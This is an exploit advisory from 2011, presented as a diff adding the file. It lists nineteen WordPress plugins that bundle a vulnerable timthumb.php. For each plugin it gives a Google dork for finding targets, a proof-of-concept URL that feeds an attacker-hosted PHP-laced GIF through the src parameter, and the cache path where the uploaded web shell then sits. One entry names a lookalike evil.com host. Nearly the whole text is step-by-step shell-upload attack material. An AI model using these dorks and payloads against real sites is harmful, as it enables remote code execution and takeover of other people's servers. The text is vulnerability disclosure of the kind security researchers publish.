@@ -1,0 +1,236 @@
+# Exploit Title: Multiple Wordpress timthumb.php reuse vulnerabilities
+# Date: 09/19/2011
+# Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+
+---
+Description
+---
+The following Wordpress plugins reuse a vulnerable version of the timthumb.php library.
+
+By hosting a malicious GIF file with PHP code appended to the end on an attacker controlled
+domain such as blogger.com.evil.com and then providing it to the script through the
+src GET parameter, it is possible to upload a shell and execute arbitrary code on the webserver.
+
+Reference: http://www.exploit-db.com/exploits/17602/
+
+# Plugin: Category Grid View Gallery Wordpress plugin Shell Upload vulnerability
+# Google Dork: inurl:wp-content/plugins/category-grid-view-gallery
+# Software Link: http://wordpress.org/extend/plugins/category-grid-view-gallery/download/
+# Version: 0.1.1
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/category-grid-view-gallery/includes/timthumb.php?src=MALICIOUS_URL
+
+The uploaded shell can be found at /wp-content/plugins/category-grid-view-gallery/cache/externel_md5(src).php
+
+# Plugin: Auto Attachments Wordpress plugin Shell Upload vulnerability
+# Google Dork: inurl:wp-content/plugins/auto-attachments
+# Software Link: http://wordpress.org/extend/plugins/auto-attachments/download/
+# Version: 0.2.9
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/auto-attachments/thumb.php?src=MALICIOUS_URL
+
+The uploaded shell can be found at /wp-content/plugins/auto-attachments/cache/external_md5(src).php
+
+# Plugin: WP Marketplace Wordpress plugin Shell Upload vulnerability
+# Google Dork: inurl:wp-content/plugins/wp-marketplace
+# Software Link: http://wordpress.org/extend/plugins/wp-marketplace/download/
+# Version: 1.1.0
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/wp-marketplace/libs/timthumb.php?src=MALICIOUS_URL
+
+The uploaded shell can be found at /wp-content/plugins/wp-marketplace/libs/cache/external_md5(src).php
+
+# Plugin: DP Thumbnail Wordpress plugin Shell Upload vulnerability
+# Google Dork: inurl:wp-content/plugins/dp-thumbnail
+# Software Link: http://wordpress.org/extend/plugins/dp-thumbnail/download/
+# Version: 1.0
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/dp-thumbnail/timthumb/timthumb.php?src=MALICIOUS_URL
+
+The uploaded shell can be found at /wp-content/plugins/dp-thumbnail/timthumb/cache/external_md5(src).php
+
+# Plugin: Vk Gallery Wordpress plugin Shell Upload vulnerability
+# Google Dork: inurl:wp-content/plugins/vk-gallery
+# Software Link: http://wordpress.org/extend/plugins/vk-gallery/download/
+# Version: 1.1.0
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/vk-gallery/lib/timthumb.php?src=MALICIOUS_URL
+
+The uploaded shell can be found at /wp-content/plugins/vk-gallery/lib/cache/md5(src).php
+
+# Plugin: Rekt Slideshow Wordpress plugin Shell Upload vulnerability
+# Google Dork: inurl:wp-content/plugins/rekt-slideshow
+# Software Link: http://wordpress.org/extend/plugins/rekt-slideshow/download/
+# Version: 1.0.5
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/rekt-slideshow/picsize.php?src=MALICIOUS_URL
+
+Must first base64 encode the URL.
+
+The uploaded shell can be found at /wp-content/plugins/rekt-slideshow/cache/md5(src).php
+
+# Plugin: CAC Featured Content Wordpress plugin Shell Upload vulnerability
+# Google Dork: inurl:wp-content/plugins/cac-featured-content
+# Software Link: http://wordpress.org/extend/plugins/cac-featured-content/download/
+# Version: 0.8
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/cac-featured-content/timthumb.php?src=MALICIOUS_URL
+
+The uploaded shell can be found at /wp-content/plugins/cac-featured-content/temp/md5(src).php
+
+# Plugin: Rent A Car Wordpress plugin Shell Upload vulnerability
+# Google Dork: inurl:wp-content/plugins/rent-a-car
+# Software Link: http://wordpress.org/extend/plugins/rent-a-car/download/
+# Version: 1.0
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/rent-a-car/libs/timthumb.php?src=MALICIOUS_URL
+
+The uploaded shell can be found at /wp-content/plugins/rent-a-car/libs/cache/external_md5(src).php
+
+
+# Plugin: LISL Last Image Slider Wordpress plugin Shell Upload vulnerability
+# Google Dork: inurl:wp-content/plugins/lisl-last-image-slider
+# Software Link: http://wordpress.org/extend/plugins/lisl-last-image-slider/download/
+# Version: 1.0
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/lisl-last-image-slider/timthumb.php?src=MALICIOUS_URL
+
+The uploaded shell can be found at /wp-content/plugins/lisl-last-image-slider/cache/external_md5(src).php
+
+# Plugin: Islidex Wordpress plugin Shell Upload vulnerability
+# Google Dork: inurl:wp-content/plugins/islidex
+# Software Link: http://wordpress.org/extend/plugins/islidex/download/
+# Version: 2.7
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/islidex/js/timthumb.php?src=MALICIOUS_URL
+
+The uploaded shell can be found at /wp-content/plugins/islidex/js/cache/md5(src).php
+
+# Plugin: Kino Gallery Wordpress plugin Shell Upload vulnerability
+# Google Dork: inurl:wp-content/plugins/kino-gallery
+# Software Link: http://wordpress.org/extend/plugins/kino-gallery/download/
+# Version: 1.0
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/kino-gallery/timthumb.php?src=MALICIOUS_URL
+
+The uploaded shell can be found at /wp-content/plugins/kino-gallery/cache/external_md5(src).php
+
+# Plugin: Cms Pack Wordpress plugin Shell Upload vulnerability
+# Google Dork: inurl:wp-content/plugins/cms-pack
+# Software Link: http://wordpress.org/extend/plugins/cms-pack/download/
+# Version: 1.3
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/cms-pack/timthumb.php?src=MALICIOUS_URL
+
+The uploaded shell can be found at /wp-content/uploads/cms-pack-cache/external_md5(src).php
+
+# Plugin: A Gallery Wordpress plugin Shell Upload vulnerability
+# Google Dork: inurl:wp-content/plugins/a-gallery
+# Software Link: http://wordpress.org/extend/plugins/a-gallery/download/
+# Version: 0.9
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/a-gallery/timthumb.php?src=MALICIOUS_URL
+
+The uploaded shell can be found at /wp-content/plugins/a-gallery/cache/external_md5(src).php
+
+# Plugin: Category List Portfolio Page Wordpress plugin Shell Upload vulnerability
+# Google Dork: inurl:wp-content/plugins/category-list-portfolio-page
+# Software Link: http://wordpress.org/extend/plugins/category-list-portfolio-page/download/
+# Version: 0.9
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/category-list-portfolio-page/scripts/timthumb.php?src=MALICIOUS_URL
+
+The uploaded shell can be found at /wp-content/plugins/category-list-portfolio-page/scripts/cache/external_md5(src).php
+
+# Plugin: Really Easy Slider Wordpress plugin Shell Upload vulnerability
+# Google Dork: inurl:wp-content/plugins/really-easy-slider
+# Software Link: http://wordpress.org/extend/plugins/really-easy-slider/download/
+# Version: 0.1
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/really-easy-slider/inc/thumb.php?src=MALICIOUS_URL
+
+The uploaded shell can be found at /wp-content/plugins/really-easy-slider/inc/cache/external_md5(src).php
+
+# Plugin: Verve Meta Boxes Wordpress plugin Shell Upload vulnerability
+# Google Dork: inurl:wp-content/plugins/verve-meta-boxes
+# Date: 09/19/2011
+# Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+# Software Link: http://wordpress.org/extend/plugins/verve-meta-boxes/download/
+# Version: 1.2.8
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/verve-meta-boxes/tools/timthumb.php?src=MALICIOUS_URL
+
+The uploaded shell can be found at /wp-content/plugins/verve-meta-boxes/tools/cache/external_md5(src).php
+
+# Plugin: User Avatar Wordpress plugin shell upload vulnerability
+# Google Dork: inurl:wp-content/plugins/user-avatar
+# Software Link: http://wordpress.org/extend/plugins/user-avatar/download/
+# Version: 1.3.7
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/user-avatar/user-avatar-pic.php?id=0&allowedSites[]=blogger.com&src=http://blogger.com.evil.com/poc.php
+
+Requires register_globals to be enabled and at least one user account to have an avatar directory.
+
+The uploaded shell can be found at /wp-content/uploads/avatars/$id/external_md5(src).php
+
+# Plugin: Extend Wordpress Wordpress plugin Shell Upload vulnerability
+# Google Dork: inurl:wp-content/plugins/extend-wordpress
+# Software Link: http://wordpress.org/extend/plugins/extend-wordpress/download/
+# Version: 1.3.7
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/extend-wordpress/helpers/timthumb/image.php?src=MALICIOUS_URL
+
+The uploaded shell can be found at /wp-content/plugins/extend-wordpress/helpers/timthumb/cache/external_md5(src).php
